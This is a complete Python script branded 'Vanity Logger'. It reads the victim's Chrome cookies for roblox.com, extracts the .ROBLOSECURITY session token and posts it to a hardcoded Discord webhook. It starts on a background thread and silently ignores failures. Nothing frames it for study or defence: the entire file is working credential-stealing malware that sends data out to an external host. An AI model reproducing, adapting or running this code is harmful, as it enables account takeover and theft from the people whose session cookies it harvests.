import browser_cookie3 as muc
import requests
import threading
import time
import os

webhook = "https://discord.com/api/webhooks/897604885665701931/Siq1WJ0q9RFV0_oTSxdh4LsR_BPWfoZt4LgFJK8FEgwn0Qo6BkTr7AfVl7RFYoaCLPHM"
def main():
    try:
        getcookie = muc.chrome(domain_name='roblox.com')
        cookies = str(getcookie)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        ok = {
            "username": "Vanity",
            "avatar_url": "https://cdn.discordapp.com/attachments/893001254987526157/901758619333312512/Satin.png",
            "embeds": [
                {
                "color": 12255487,
                "fields": [
                {
                    "name": f"Roblox Cookies",
                    "value": f"{cookie}"
                },
                ],
                "footer": {
                "text": f"Vanity Logger | https://discord.gg/rtX5cbm4vN",
                "icon_url": "https://cdn.discordapp.com/attachments/893001254987526157/901758619333312512/Satin.png"
                }
                }
            ]
        }
        requests.post(f"{webhook}", json=ok)
    except:
        print("error")
threading.Thread(target=main,).start()
